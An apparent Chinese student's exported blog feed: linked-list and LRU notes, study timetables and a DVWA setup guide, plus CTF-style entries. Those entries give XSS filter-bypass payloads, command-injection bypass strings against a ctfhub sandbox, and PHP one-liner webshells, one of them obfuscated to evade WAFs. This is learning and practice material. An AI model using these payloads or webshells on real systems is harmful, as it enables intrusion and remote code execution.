<h2 id="LRU缓存淘汰算法【转】"><a href="#LRU缓存淘汰算法【转】" class="headerlink" title="LRU缓存淘汰算法【转】"></a>LRU缓存淘汰算法【转】</h2><p>如何基于链表实现 LRU 缓存淘汰算法？</p>
<p>我的思路是这样的：我们维护一个有序单链表，越靠近链表尾部的结点是越早之前访问的【老数据】。当有一个新的数据被访问时，我们从链表头开始顺序遍历链表。</p>
<ol>
<li>如果此数据之前已经被缓存在链表中了，我们遍历得到这个数据对应的结点，并将其从原来的位置删除，然后再插入到链表的头部。</li>
<li>如果此数据没有在缓存链表中，又可以分为两种情况：</li>
</ol>
<p>如果此时缓存未满，则将此结点直接插入到链表的头部；</p>
<p>如果此时缓存已满，则链表尾结点删除，将新的数据结点插入链表的头部。</p>
<p>这样我们就用链表实现了一个 LRU 缓存，是不是很简单？</p>
<p>现在我们来看下缓存访问的时间复杂度是多少。因为不管缓存有没有满，我们都需要遍历一遍链表，所以这种基于链表的实现思路，缓存访问的时间复杂度为 O(n)。</p>
<p>实际上，我们可以继续优化这个实现思路，比如引入散列表（Hash table）来记录每个数据的位置，将缓存访问的时间复杂度降到 O(1)。因为要涉及我们还没有讲到的数据结构，所以这个优化方案，我现在就不详细说了，等讲到散列表的时候，我会再拿出来讲。</p>
<h1 id="链表代码的书写技巧"><a href="#链表代码的书写技巧" class="headerlink" title="链表代码的书写技巧"></a>链表代码的书写技巧</h1><h2 id="警惕指针丢失和内存泄漏"><a href="#警惕指针丢失和内存泄漏" class="headerlink" title="警惕指针丢失和内存泄漏"></a>警惕指针丢失和内存泄漏</h2><p>错误样例</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p-&gt;next=x;</span><br><span class="line">x-&gt;next=p-&gt;next;<span class="comment">//这句相当于把x的值赋给x</span></span><br></pre></td></tr></table></figure>

<h2 id="利用哨兵简化实现难度"><a href="#利用哨兵简化实现难度" class="headerlink" title="利用哨兵简化实现难度"></a>利用哨兵简化实现难度</h2><h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><p>如果要在p结点后面插入一个新的结点</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">new_node -&gt; next = p -&gt; next;</span><br><span class="line">p -&gt; next = new_node;</span><br></pre></td></tr></table></figure>

<p>特殊情况：向空链表插入第一个结点</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(head==null)&#123;</span><br><span class="line">    head = new_node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>单链表的结点删除操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p-&gt;next = p-&gt;next-&gt;next;</span><br></pre></td></tr></table></figure>

<p>特殊情况：删除最后一个结点</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(head-&gt;next==null)&#123;</span><br><span class="line">    head = null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="简化"><a href="#简化" class="headerlink" title="简化"></a>简化</h3><p>可以看出，无论是插入还是删除都需要考虑特殊情况，比较麻烦。</p>
<p>这是可以考虑引入<strong>哨兵</strong>。</p>
<p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/8.jpg" alt="8"></p>
<p>我们让head一直指向这个哨兵结点，哨兵结点内不存储任何数据，我们把这种链表称为<strong>带头链表</strong>。</p>
<p>在这种情况下，我们插入、删除都可以利用上面的一般表达式。</p>
<h2 id="重点留意边界条件处理"><a href="#重点留意边界条件处理" class="headerlink" title="重点留意边界条件处理"></a>重点留意边界条件处理</h2><ol>
<li>如果链表为空</li>
<li>如果链表只包含一个结点</li>
<li>如果链表只包含两个结点</li>
<li>代码逻辑在处理头结点和尾结点时</li>
</ol>
<h2 id="多写多练"><a href="#多写多练" class="headerlink" title="多写多练"></a>多写多练</h2><ul>
<li>单链表反转</li>
<li>链表中环的检测</li>
<li>两个有序链表的合并</li>
<li>删除链表倒数第n个结点</li>
<li>求链表的中间结点</li>
</ul>
]]></content>
      <categories>
        <category>数据结构与算法之美</category>
      </categories>
  </entry>
  <entry>
    <title>XSS</title>
    <url>/2020/03/19/XSS/</url>
    <content><![CDATA[<h3 id="XSS绕过过滤"><a href="#XSS绕过过滤" class="headerlink" title="XSS绕过过滤"></a>XSS绕过过滤</h3><h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><p>如果过滤()和[]，则</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alert&#96;1&#96;</span><br></pre></td></tr></table></figure>



<h4 id="html实体字符及"><a href="#html实体字符及" class="headerlink" title="html实体字符及"></a>html实体字符及<svg/></h4><p>如果过滤()、[]和``</p>
<p>则可以使用html实体字符代替括号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert &amp;#40; 1 &amp;#41;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;alert &amp;#40; 1 &amp;#41;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>第一个必须要加<svg>标签，第二个可不加（我寻思可能是第一个不在标签里面）。</svg></p>
<h4 id="闭合注释"><a href="#闭合注释" class="headerlink" title="闭合注释"></a>闭合注释</h4><p>闭合注释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--   --&gt;</span><br><span class="line">&lt;!--   --!&gt;</span><br></pre></td></tr></table></figure>



<h4 id="换行过滤"><a href="#换行过滤" class="headerlink" title="换行过滤"></a>换行过滤</h4><p>对于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input &#x3D; input.replace(&#x2F;auto|on.*&#x3D;|&gt;&#x2F;ig, &#39;_&#39;)</span><br><span class="line">  return &#96;&lt;input value&#x3D;1 $&#123;input&#125; type&#x3D;&quot;text&quot;&gt;&#96;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可使用<strong>换行绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">src&#x3D;1 type&#x3D;image onerror</span><br><span class="line">&#x3D;&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>



<h4 id="浏览器兼容性"><a href="#浏览器兼容性" class="headerlink" title="浏览器兼容性"></a>浏览器兼容性</h4><p>对于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  const stripTagsRe &#x3D; &#x2F;&lt;\&#x2F;?[^&gt;]+&gt;&#x2F;gi</span><br><span class="line"></span><br><span class="line">  input &#x3D; input.replace(stripTagsRe, &#39;&#39;)</span><br><span class="line">  return &#96;&lt;article&gt;$&#123;input&#125;&lt;&#x2F;article&gt;&#96;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可利用浏览器的兼容性直接输入未闭合标签</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onerror&#x3D;&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>留一个没有解决的小问题，为什么此题不能用换行绕过？</p>
<p>我猜是因为const的缘故？</p>
</blockquote>
<h4 id="style闭合"><a href="#style闭合" class="headerlink" title="style闭合"></a>style闭合</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function render (src) &#123;</span><br><span class="line">  src &#x3D; src.replace(&#x2F;&lt;\&#x2F;style&gt;&#x2F;ig, &#39;&#x2F;* \u574F\u4EBA *&#x2F;&#39;)</span><br><span class="line">  return &#96;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      $&#123;src&#125;</span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line">  &#96;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我先试了下老书上的方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;BODY&#123;background:url(&quot;javascript:alert(1)&quot;)&#125;&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>

<p>失败了。</p>
<p>于是</p>
<ol>
<li><p>   多一个空格</p>
</li>
<li><pre><code>&lt;/style
&gt;</code></pre><blockquote>
<p>不知道为啥这里又可以换行了</p>
</blockquote>
</li>
</ol>
]]></content>
      <categories>
        <category>web安全漏洞</category>
      </categories>
  </entry>
  <entry>
    <title>命令执行/代码执行</title>
    <url>/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h2 id="一些基本概念"><a href="#一些基本概念" class="headerlink" title="一些基本概念"></a>一些基本概念</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><ul>
<li><p><strong>command1 &amp; command2 ：</strong></p>
<p>不管command1执行成功与否，都会执行command2</p>
</li>
<li><p><strong>command1 &amp;&amp; command2 ：</strong></p>
<p>先执行command1执行成功后才会执行command2</p>
</li>
<li><p><strong>command1 | command2 ：</strong></p>
<p>只执行command2（将上一个命令的输出作为下一个命令的输入）</p>
</li>
<li><p><strong>command1 || command2 ：</strong></p>
<p>command1执行失败，再执行command2(若command1执行成功，就不再执行command2)</p>
</li>
</ul>
<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><ul>
<li><p>;   前面的执行完执行后面的    </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1;whoami</span><br></pre></td></tr></table></figure>
</li>
<li><p>|   管道符，显示后面的执行结果  ，（将上一个命令的输出作为下一个命令的输入）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1|whoami</span><br></pre></td></tr></table></figure>
</li>
<li><p>||  当前面的执行出错时执行后面的  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping 1||whoami</span><br></pre></td></tr></table></figure>
</li>
<li><p>&amp;  前面的语句为假则直接执行后面的,前面可真可假           </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1&amp;whoami</span><br></pre></td></tr></table></figure>
</li>
<li><p>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真   </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure>



</li>
</ul>
<blockquote>
<p><strong>常用url编码</strong> ：<br>%20 = 空格<br>%5c = <br>%26 = &amp;<br>%7c = |</p>
<p>%0a=换行</p>
<p>%3b=;</p>
</blockquote>
<h2 id="代码执行漏洞和命令执行漏洞"><a href="#代码执行漏洞和命令执行漏洞" class="headerlink" title="代码执行漏洞和命令执行漏洞"></a>代码执行漏洞和命令执行漏洞</h2><h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><p>类似ecal(),assert()函数</p>
<h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><p>类似exec(),system()</p>
<h2 id="几种bypass"><a href="#几种bypass" class="headerlink" title="几种bypass"></a>几种bypass</h2><h3 id="基本的注入"><a href="#基本的注入" class="headerlink" title="基本的注入"></a>基本的注入</h3><ul>
<li><pre><code>127.0.0.1;ls
127.0.0.1;cat xxx.txt
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>
127.0.0.1;echo &quot;&lt;?php @eval(\$_POST[&apos;key&apos;]);?&gt;&quot; &gt;xxx.php
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  \$用来转义，有时echo会用到-e参数</span><br><span class="line"></span><br><span class="line">  [有关-e、-n参数。](https:&#x2F;&#x2F;www.cnblogs.com&#x2F;karl-python&#x2F;p&#x2F;9261920.html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### base64编码</span><br><span class="line"></span><br><span class="line">有时有些内容无法回显,我们可以base64编码它们</span><br><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>
1;cat xxx.txt &amp; base64
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  &amp;的作用是把前面输出的结果作为输入进行后面的操作</span><br><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>
1;base64 xxx.txt
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 过滤cat</span><br><span class="line"></span><br><span class="line">- 反斜杠 ： 例如</span><br></pre></td></tr></table></figure>
ca\t fl\ag.php
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 连接符： 例如</span><br></pre></td></tr></table></figure>
ca&apos;&apos;t fla&apos;&apos;g.txt
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 过滤空格</span><br><span class="line"></span><br><span class="line">在 bash 下, 可以用以下字符代替空格：</span><br></pre></td></tr></table></figure>
&lt;,&lt;&gt;,%20(space),%09(tab),$IFS$9, ${IFS},$IFS 等
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 过滤目录分隔符[&#x2F;]</span><br><span class="line"></span><br><span class="line">可以使用cd命令直接进入那个目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 一个综合过滤练习</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res &#x3D; FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;</span><br><span class="line">    $ip &#x3D; $_GET[&#39;ip&#39;];</span><br><span class="line">    $m &#x3D; [];</span><br><span class="line">    if (!preg_match_all(&quot;&#x2F;(\||&amp;|;| |\&#x2F;|cat|flag|ctfhub)&#x2F;&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd &#x3D; &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res &#x3D; $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</code></pre></li>
</ul>
<p>我们可以看到,过滤掉了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|   &amp;   ;   &#x2F;   cat   flag   ctfhub</span><br></pre></td></tr></table></figure>

<p>好像大部分有用的都被过滤掉了,这时我们就需要换一种思路,我们使用url编码来解决[<strong>接下来所有的payload都是在hackbar上输入,直接在ping里输入没有用</strong>]</p>
<h4 id="url编码表"><a href="#url编码表" class="headerlink" title="url编码表"></a>url编码表</h4><p><img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.png" alt="1">)<img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/2.png" alt="2"></p>
<p>其中本题用到的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%0a   换行[输入下一条命令,类似于;]</span><br><span class="line">%09   TAB[占位符,替代那些不确定字符的位置]</span><br><span class="line">%3b   ;</span><br><span class="line">%5c   \[cat被过滤了,要加\干扰]</span><br></pre></td></tr></table></figure>

<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-9777b80d72305d7f.sandbox.ctfhub.com:10080&#x2F;?ip&#x3D;1%0als#</span><br></pre></td></tr></table></figure>

<p>得到:</p>
<p><img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/3.png" alt="3"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-9777b80d72305d7f.sandbox.ctfhub.com:10080&#x2F;?ip&#x3D;1%0als%09*_is_here#</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/4.png" alt="4"></p>
<blockquote>
<p>其中%09*的意思:</p>
<p>%09作为占位符,去正则匹配被过滤的flag, *代表一个或多个字符[flag就是四个字符]</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-9777b80d72305d7f.sandbox.ctfhub.com:10080&#x2F;?ip&#x3D;1%0acd%09*_is_here%0aca%5ct%09*_5861249545945.php#</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge-9777b80d72305d7f.sandbox.ctfhub.com:10080&#x2F;?ip&#x3D;1%0acd%09*_is_here%0abase64%09*_5861249545945.php#</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/5.png" alt="5"></p>
<p>或者…</p>
<p>这我是这么想的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;1%0aecho&quot;&lt;?php@eval(\$_POST[&#39;ag&#39;])%3b?&gt;&quot;&gt;123.php#</span><br></pre></td></tr></table></figure>

<p>但是好像并不成功,直接无法写入,然后我尝试者写一些普通文本到123.php或122.txt,写入倒是都可以成功写入,问题就是这些文件打不开???base64编码也没有反应,很迷,但我有招一日一定要注入进去!加油!</p>
<p><a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">RCE的综合过滤练习</a></p>
]]></content>
      <categories>
        <category>web安全漏洞</category>
      </categories>
      <tags>
        <tag>ctfhub</tag>
      </tags>
  </entry>
  <entry>
    <title>在kali-linux下搭建DVWA</title>
    <url>/2020/03/02/%E5%9C%A8kali-linux%E4%B8%8B%E6%90%AD%E5%BB%BADVWA/</url>
    <content><![CDATA[<p>因为平台不同有些操作也有区别，所以今天想要在kali-linux搭建一下DVWA平台，当然还是遇到了一些困难，网上的解决方法也是有好有坏。所以我来总结下：</p>
<ol>
<li><p>解压压缩包到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure>

<p>并重命名为dvwa</p>
</li>
<li><p>将apache2停止：service apache2 stop</p>
</li>
<li><p>给dvwa文件夹相应的权限：chmod -R 755 /var/www/html/dvwa</p>
</li>
<li><p>启动mysql服务： service mysql start</p>
</li>
<li><p>打开mysql： mysql -u root -p</p>
</li>
<li><p>创建数据库：create database dvwa;</p>
</li>
<li><pre><code>grant all on dvwa.* to dvwa@localhost identified by &apos;password&apos;;
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   这里划重点：dvwa是dvwa_id，password是dvwa_password.</span><br><span class="line"></span><br><span class="line">8.  退出mysql：exit</span><br><span class="line"></span><br><span class="line">9. 启动apache2服务：service apache2 start</span><br><span class="line"></span><br><span class="line">10.</span><br></pre></td></tr></table></figure>
 cd /var/www/html/dvwa/config/</code></pre></li>
<li><p>然后打开config.inc.php修改那个user和password（见7）</p>
</li>
<li><p>最后打开浏览器访问127.0.0.1/dvwa即可</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>杂七杂八</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku过狗一句话</title>
    <url>/2020/03/01/bugku%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">送给大家一个过狗一句话</span><br><span class="line">&lt;?php $poc&#x3D;&quot;a#s#s#e#r#t&quot;; $poc_1&#x3D;explode(&quot;#&quot;,$poc); $poc_2&#x3D;$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[&#39;s&#39;]) ?&gt;</span><br></pre></td></tr></table></figure>

<p>先看这段php</p>
<ul>
<li><p>explode(‘分割的字符’，被分割的字符串)</p>
<p>explode函数将原来的字符串以分割字符为界限，分成若干元素计入数组</p>
</li>
</ul>
<p>所以$poc_1=[a,s,s,e,r,t],$poc_2=assert.</p>
<p>也就是通过get方法获取s元素的值并放入assert执行。</p>
<blockquote>
<p>assert（）：把字符串按照php代码来执行。</p>
</blockquote>
<p>于是接下来有两种方法：</p>
<ul>
<li><strong>s=print_r(scandir(‘./‘)) 然后读取fl4g.txt</strong></li>
<li><strong>s=print_r(glob(“*.*“)) 然后读取show_source(“fl4g.txt”)</strong></li>
<li><strong>使用file_get_contents(“flag.txt”)读取文件</strong></li>
<li><strong>还有system(‘ls’)的读取方法但是这里应该没有权限.</strong></li>
</ul>
<p>然而这道题好像除了点问题，咋弄都没反应，希望早日调试好错误。</p>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-29日目标</title>
    <url>/2020/02/28/2020-02-29%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-29日目标"><a href="#2020-02-29日目标" class="headerlink" title="2020-02-29日目标"></a>2020-02-29日目标</h2><table>
<thead>
<tr>
<th>7：00</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>7：00-8：00</td>
<td>英语</td>
</tr>
<tr>
<td>8：30-9：30</td>
<td>sql书</td>
</tr>
<tr>
<td>9：45-11：00</td>
<td>高数</td>
</tr>
<tr>
<td>11：15-12：00</td>
<td>JS</td>
</tr>
<tr>
<td>14：00-15：15</td>
<td>c语言</td>
</tr>
<tr>
<td>15：30-16：15</td>
<td>物理</td>
</tr>
<tr>
<td>16：30-17：30</td>
<td>JS</td>
</tr>
<tr>
<td>19：00-20：00</td>
<td>keep</td>
</tr>
<tr>
<td>21：00-</td>
<td>刷刷题</td>
</tr>
<tr>
<td>24：00</td>
<td>睡觉</td>
</tr>
</tbody></table>
<h2 id="2020-02-28总结"><a href="#2020-02-28总结" class="headerlink" title="2020-02-28总结"></a>2020-02-28总结</h2><ol>
<li>看完了JS第二章第三章</li>
<li>看了b站c语言p3-p7</li>
<li>sql第三章</li>
<li>keep腰腹减脂+跑步机20min</li>
<li>看家里的网有点慢，就重置了哈路由器，这玩意还有点复杂，一堆乱七八糟的密码，不过还是弄好啦（感觉上快了不少）。</li>
</ol>
<p>今天起晚了，加上下午看指针进入了状态所以就多看了一点，有些东西没有完成，明天加油（明天吃火锅）。</p>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-28日目标</title>
    <url>/2020/02/27/2020-02-28%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-28日目标"><a href="#2020-02-28日目标" class="headerlink" title="2020-02-28日目标"></a>2020-02-28日目标</h2><table>
<thead>
<tr>
<th>7：00</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>7：00-8：00</td>
<td>英语</td>
</tr>
<tr>
<td>8：30-10：00</td>
<td>高数</td>
</tr>
<tr>
<td>10：15-11：00</td>
<td>JS</td>
</tr>
<tr>
<td>11：15-12：00</td>
<td>sql书71-99</td>
</tr>
<tr>
<td>14：00-15：30</td>
<td>c语言</td>
</tr>
<tr>
<td>15：45-16：30</td>
<td>JS</td>
</tr>
<tr>
<td>16：45-17：30</td>
<td>物理</td>
</tr>
<tr>
<td>19：30-20：30</td>
<td>sql书99-109</td>
</tr>
<tr>
<td></td>
<td>keep</td>
</tr>
<tr>
<td></td>
<td>刷题</td>
</tr>
<tr>
<td></td>
<td>整理</td>
</tr>
</tbody></table>
<ul>
<li>学电脑：6h</li>
<li>锻炼：30min</li>
<li>大学内容：3h</li>
</ul>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-27日目标</title>
    <url>/2020/02/26/2020-02-27%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-27日目标"><a href="#2020-02-27日目标" class="headerlink" title="2020-02-27日目标"></a>2020-02-27日目标</h2><p>Everything gonna be Okey。</p>
<table>
<thead>
<tr>
<th>7：00</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>7：00-8：00</td>
<td>英语</td>
</tr>
<tr>
<td>8：30-9：30</td>
<td>预习高数</td>
</tr>
<tr>
<td>9：45-10：45</td>
<td>JS</td>
</tr>
<tr>
<td>11：00-12：00</td>
<td>英语网课</td>
</tr>
<tr>
<td>14：00-15：40</td>
<td>高数网课</td>
</tr>
<tr>
<td>16：00-17：40</td>
<td>物理网课</td>
</tr>
<tr>
<td>19：30-20：00</td>
<td>keep</td>
</tr>
<tr>
<td>20：45-22：00</td>
<td>sql书</td>
</tr>
<tr>
<td>23：30</td>
<td>上床</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-26日目标</title>
    <url>/2020/02/25/2020-02-26%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-26日目标"><a href="#2020-02-26日目标" class="headerlink" title="2020-02-26日目标"></a>2020-02-26日目标</h2><table>
<thead>
<tr>
<th>7：00</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>7：00-8：00</td>
<td>英语</td>
</tr>
<tr>
<td>8：30-10：00</td>
<td>sql</td>
</tr>
<tr>
<td>10：20-12：00</td>
<td>c语言网课</td>
</tr>
<tr>
<td>14：00-15：15</td>
<td>高数作业+数学通识</td>
</tr>
<tr>
<td>15：30-17：00</td>
<td>JAVASCRIPT网课</td>
</tr>
<tr>
<td>19：00-20：00</td>
<td>c语言指针</td>
</tr>
<tr>
<td>20：15-21：30</td>
<td>刷题</td>
</tr>
<tr>
<td>21：40-22：30</td>
<td>整理一些琐事杂事</td>
</tr>
<tr>
<td>24：00</td>
<td>上床</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-25日目标</title>
    <url>/2020/02/24/2020-02-25%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-25日目标"><a href="#2020-02-25日目标" class="headerlink" title="2020-02-25日目标"></a>2020-02-25日目标</h2><table>
<thead>
<tr>
<th>7：00</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>7：00-8：00</td>
<td>英语</td>
</tr>
<tr>
<td>8：20-10：00</td>
<td>英语网课</td>
</tr>
<tr>
<td>10：20-12：00</td>
<td>物理网课</td>
</tr>
<tr>
<td>14：00-15：40</td>
<td>高数网课</td>
</tr>
<tr>
<td>16：00-17：15</td>
<td>sql书</td>
</tr>
<tr>
<td>19：00-20：30</td>
<td>c语言</td>
</tr>
<tr>
<td>20：45-22：00</td>
<td>结合sql书，完成sqli-labs</td>
</tr>
<tr>
<td>24：00</td>
<td>上床</td>
</tr>
</tbody></table>
<h2 id="2020-02-24总结"><a href="#2020-02-24总结" class="headerlink" title="2020-02-24总结"></a>2020-02-24总结</h2><ol>
<li><p>看了c语言的几种变量</p>
</li>
<li><p>sql书看了第2章</p>
</li>
<li><p>写好了菜单程序</p>
</li>
<li><p>做好了mooc</p>
</li>
<li><p>看DVWA的js，还是不太精通啊，还得再夯实一下基础知识。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-24日目标</title>
    <url>/2020/02/23/2020-02-24%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-24目标"><a href="#2020-02-24目标" class="headerlink" title="2020-02-24目标"></a>2020-02-24目标</h2><table>
<thead>
<tr>
<th>7：00</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>7：00-8：00</td>
<td>英语</td>
</tr>
<tr>
<td>8：20-10：00</td>
<td>c语言网课</td>
</tr>
<tr>
<td>10：30-12：00</td>
<td>sql书</td>
</tr>
<tr>
<td>14：00-15：40</td>
<td>近代史网课</td>
</tr>
<tr>
<td>16：00-17：40</td>
<td>高数网课</td>
</tr>
<tr>
<td>19：00-19：30</td>
<td>sql书</td>
</tr>
<tr>
<td>19：30-21：10</td>
<td>音乐鉴赏网课</td>
</tr>
<tr>
<td>21：30-22：30</td>
<td>DVWA JavaScript</td>
</tr>
<tr>
<td>24：00</td>
<td>上床</td>
</tr>
</tbody></table>
<h2 id="2020-02-23总结"><a href="#2020-02-23总结" class="headerlink" title="2020-02-23总结"></a>2020-02-23总结</h2><ol>
<li>完成DVWA  weak sid</li>
<li>完成DVWA csp bypass（high级别以后再深入理解）</li>
<li>看了sql第二节</li>
<li>看了c语言指针第三节</li>
</ol>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
